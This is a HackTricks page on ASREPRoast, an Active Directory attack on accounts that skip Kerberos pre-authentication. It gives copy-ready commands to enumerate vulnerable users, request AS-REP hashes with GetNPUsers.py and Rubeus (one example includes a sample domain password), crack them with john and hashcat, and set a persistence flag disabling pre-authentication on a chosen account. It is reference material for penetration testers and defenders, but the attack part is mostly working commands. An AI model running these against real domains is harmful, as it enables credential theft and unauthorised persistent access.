ASREPRoast - HackTricks

#

ASREPRoast[![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1580'%3e%3cg data-evernote-id='1581' class='js-evernote-checked'%3e%3cpath d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71' data-evernote-id='1582' class='js-evernote-checked'%3e%3c/path%3e%3cpath d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71' data-evernote-id='1583' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#asreproast)

The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute (**[***DONT_REQ_PREAUTH***](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)***)***.

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain.** Otherwise usernames have to be guessed**.

###

Enumerating vulnerable users (need domain credentials)[![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1632'%3e%3cg data-evernote-id='1633' class='js-evernote-checked'%3e%3cpath d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71' data-evernote-id='1634' class='js-evernote-checked'%3e%3c/path%3e%3cpath d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71' data-evernote-id='1635' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#enumerating-vulnerable-users-need-domain-credentials)

![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1639'%3e%3cg data-evernote-id='1640' class='js-evernote-checked'%3e%3crect x='9' y='9' width='13' height='13' rx='2' ry='2' data-evernote-id='1641' class='js-evernote-checked'%3e%3c/rect%3e%3cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' data-evernote-id='1642' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)Copy

Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView

###

Request AS_REP message[![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1655'%3e%3cg data-evernote-id='1656' class='js-evernote-checked'%3e%3cpath d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71' data-evernote-id='1657' class='js-evernote-checked'%3e%3c/path%3e%3cpath d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71' data-evernote-id='1658' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#request-as_rep-message)

![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1662'%3e%3cg data-evernote-id='1663' class='js-evernote-checked'%3e%3crect x='9' y='9' width='13' height='13' rx='2' ry='2' data-evernote-id='1664' class='js-evernote-checked'%3e%3c/rect%3e%3cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' data-evernote-id='1665' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)Copy

Using Linux
2#Try all the usernames in usernames.txt

3python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

4#Use domain creds to extract targets and target them

5python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast

![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1686'%3e%3cg data-evernote-id='1687' class='js-evernote-checked'%3e%3crect x='9' y='9' width='13' height='13' rx='2' ry='2' data-evernote-id='1688' class='js-evernote-checked'%3e%3c/rect%3e%3cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' data-evernote-id='1689' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)Copy

Using Windows
6.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast

7Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

##

Cracking[![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1707'%3e%3cg data-evernote-id='1708' class='js-evernote-checked'%3e%3cpath d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71' data-evernote-id='1709' class='js-evernote-checked'%3e%3c/path%3e%3cpath d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71' data-evernote-id='1710' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#cracking)

![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1714'%3e%3cg data-evernote-id='1715' class='js-evernote-checked'%3e%3crect x='9' y='9' width='13' height='13' rx='2' ry='2' data-evernote-id='1716' class='js-evernote-checked'%3e%3c/rect%3e%3cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' data-evernote-id='1717' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)Copy

8john --wordlist=passwords_kerb.txt hashes.asreproast
9hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

##

Persistence[![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1732'%3e%3cg data-evernote-id='1733' class='js-evernote-checked'%3e%3cpath d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71' data-evernote-id='1734' class='js-evernote-checked'%3e%3c/path%3e%3cpath d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71' data-evernote-id='1735' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#persistence)

Force **preauth **not required for a user where you have **GenericAll **permissions (or permissions to write properties):

![](data:image/svg+xml,%3csvg preserveAspectRatio='xMidYMid meet' height='1em' width='1em' fill='none' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' stroke='currentColor' class='icon-7f6730be--text-3f89f380 js-evernote-checked' data-evernote-id='1749'%3e%3cg data-evernote-id='1750' class='js-evernote-checked'%3e%3crect x='9' y='9' width='13' height='13' rx='2' ry='2' data-evernote-id='1751' class='js-evernote-checked'%3e%3c/rect%3e%3cpath d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' data-evernote-id='1752' class='js-evernote-checked'%3e%3c/path%3e%3c/g%3e%3c/svg%3e)Copy

Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose

**​**[**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)**​**